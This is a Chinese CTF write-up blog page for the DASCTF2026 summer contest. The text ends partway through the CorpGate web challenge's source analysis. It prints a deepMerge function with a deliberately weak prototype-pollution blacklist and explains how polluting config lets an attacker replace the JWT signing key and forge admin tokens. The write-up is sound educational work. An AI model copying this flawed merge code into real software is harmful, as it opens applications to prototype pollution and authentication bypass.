@@ -1,0 +1,1168 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    DASCTF2026夏季赛 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Web  CorpGate 给了附件：   源码分析  入口&amp;配置 src&#x2F;app.js— 应用入口。创建 Express 实例，设置 EJS 模板引擎，挂载中间件（express.json、urlencoded、cookie-parser、静态资源），把四个路由模块都挂在 &#x2F; 下，监听 0.0.0.0:3000。 src&#x2F;config.js — 全局配置中心，所有模块共享同一个对象。生">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF2026夏季赛">
+<meta property="og:url" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="Web  CorpGate 给了附件：   源码分析  入口&amp;配置 src&#x2F;app.js— 应用入口。创建 Express 实例，设置 EJS 模板引擎，挂载中间件（express.json、urlencoded、cookie-parser、静态资源），把四个路由模块都挂在 &#x2F; 下，监听 0.0.0.0:3000。 src&#x2F;config.js — 全局配置中心，所有模块共享同一个对象。生">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530113426590.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530113728511.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530113906442.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530115540715.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530115912038.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530123206045.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530123251268.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530123704868.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530124257490.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530124417489.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530130405533.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530130523005.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530140926222.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530141152004.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530141346719.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530141634588.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530142621021.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530143736360.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530143818587.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530144446853.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530150632515.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530161927935.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530162510581.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530162516299.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530162836838.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163218953.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163246491.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163321541.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163449954.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163512955.png">
+<meta property="og:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530163619147.png">
+<meta property="article:published_time" content="2026-05-30T03:01:45.000Z">
+<meta property="article:modified_time" content="2026-05-30T09:12:09.194Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530113426590.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="DASCTF2026夏季赛">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">DASCTF2026夏季赛</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#corpgate"><span class="toc-number">1.1.</span> <span class="toc-text"> CorpGate</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.1.</span> <span class="toc-text"> 入口&amp;配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.1.2.</span> <span class="toc-text"> 工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.1.1.3.</span> <span class="toc-text"> 中间件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.1.4.</span> <span class="toc-text"> 路由</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 解题思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%AF%86%E9%92%A5"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 污染密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%AD%BE%E5%90%8D"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 伪造签名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#taxmanager"><span class="toc-number">1.2.</span> <span class="toc-text"> TaxManager</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E8%87%B3reviewer"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 提取至reviewer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 反序列化链构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97-hmac-%E7%AD%BE%E5%90%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 计算 HMAC 签名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E8%BF%9B-voucherdata"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 写进 voucherData</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%AF%BC%E5%87%BA-token"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 申请导出 token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ssti"><span class="toc-number">1.2.6.</span> <span class="toc-text"> 触发反序列化+SSTI</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inkverse"><span class="toc-number">1.3.</span> <span class="toc-text"> InkVerse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 条件竞争</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#feature-token%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.3.</span> <span class="toc-text"> Feature-Token泄露</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lattice_oraclelwe%E5%90%91%E9%87%8F%E6%9A%B4%E5%8A%9B%E6%9E%9A%E4%B8%BEaes"><span class="toc-number">2.1.</span> <span class="toc-text"> lattice_oracle(LWE向量暴力枚举+AES)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#three_friends-rsa-%E5%A4%9A%E7%B4%A0%E6%95%B0%E5%85%B1%E4%BA%AB%E6%A8%A1%E6%95%B0%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.</span> <span class="toc-text"> three_friends( RSA 多素数共享模数攻击)</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-DASCTF2026夏季赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-05-30T03:01:45.000Z" itemprop="datePublished">2026-05-30</time>
+    <time style="display: none;" id="post-update-time">2026-05-30</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
+<h3 id="corpgate"><a class="markdownIt-Anchor" href="#corpgate"></a> CorpGate</h3>
+<p>给了附件：<br />
+<img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530113426590.png" alt="image-20260530113426590" /></p>
+<h4 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析"></a> 源码分析</h4>
+<h5 id="入口配置"><a class="markdownIt-Anchor" href="#入口配置"></a> 入口&amp;配置</h5>
+<p><code>src/app.js</code>— 应用入口。创建 Express 实例，设置 EJS 模板引擎，挂载中间件（<code>express.json</code>、<code>urlencoded</code>、<code>cookie-parser</code>、静态资源），把四个路由模块都挂在 <code>/</code> 下，监听 <code>0.0.0.0:3000</code>。</p>
+<p><code>src/config.js</code> — 全局配置中心，所有模块共享同一个对象。生成随机 JWT 密钥；维护 <code>signingState</code>（当前生效密钥、版本号）；定义 <code>featureFlags</code>（导出/调试/审计开关）；定义 <code>diagnosticStore</code>（reference 临时存储）。核心隐患是 <code>configRefresh()</code>：用普通对象 <code>rotation</code> 判断 <code>rotation.pending</code>，被原型污染后会把签名密钥替换成攻击者可控的值。</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530113728511.png" alt="image-20260530113728511" /></p>
+<h5 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h5>
+<p><code>jwt.js</code> :只封装了 <code>signToken()</code>，用 <code>signingState.active</code> 作密钥签 HS256 token。验签逻辑不在这里，在中间件里</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530113906442.png" alt="image-20260530113906442" /></p>
+<p><code>merge.js</code>:递归深合并函数 <code>deepMerge</code>，自带&quot;防原型污染&quot;过滤（黑名单 + <code>sanitizeKey</code> 去点 + 限深 6）。但 <code>constructor</code>/<code>prototype</code> 只在 <code>depth &lt; 3</code> 拦截，且允许递归进 function 类型，这就是原型污染的入口。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">BLOCKED_ROOTS</span> = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;__defineGetter__&#x27;</span>, <span class="string">&#x27;__defineSetter__&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">BLOCKED_KEYS</span> = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;__defineGetter__&#x27;</span>, <span class="string">&#x27;__defineSetter__&#x27;</span>];</span><br><span class="line"><span class="comment">// 定义最大递归深度为6层</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_DEPTH</span> = <span class="number">6</span>;</span><br><span class="line"><span class="comment">// 判断一个值是否为普通对象（纯对象，不是数组也不是 null）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isPlainObject</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> val === <span class="string">&#x27;object&#x27;</span> &amp;&amp; val !== <span class="literal">null</span> &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 清理键名中的点号（.）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitizeKey</span>(<span class="params">key</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> key.<span class="title function_">replace</span>(<span class="regexp">/\./g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deepMerge</span>(<span class="params">target, source, depth</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (depth === <span class="literal">undefined</span>) depth = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (depth &gt;= <span class="variable constant_">MAX_DEPTH</span>) <span class="keyword">return</span> target;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> rawKey <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title function_">sanitizeKey</span>(rawKey);</span><br><span class="line">    <span class="keyword">if</span> (key === <span class="string">&#x27;&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">BLOCKED_KEYS</span>.<span class="title function_">indexOf</span>(key) !== -<span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (depth &lt; <span class="number">3</span> &amp;&amp; <span class="variable constant_">BLOCKED_ROOTS</span>.<span class="title function_">indexOf</span>(key) !== -<span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isPlainObject</span>(source[rawKey])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; target[key] !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title function_">deepMerge</span>(target[key], source[rawKey], depth + <span class="number">1</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">deepMerge</span>(target[key], source[rawKey], depth + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[rawKey];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; deepMerge &#125;;</span><br></pre></td></tr></table></figure>
+<h5 id="中间件"><a class="markdownIt-Anchor" href="#中间件"></a> 中间件</h5>
+<p><code>auth.js</code>：两个守卫：<code>authMiddleware</code> 从 cookie 取 token 用当前密钥验签，挂到 <code>req.user</code>；<code>adminMiddleware</code> 只检查 <code>req.user.role === 'admin'</code>（密钥可控后可被伪造绕过），后面那段 <code>rateCtx</code> 是无实际作用的干扰代码</p>
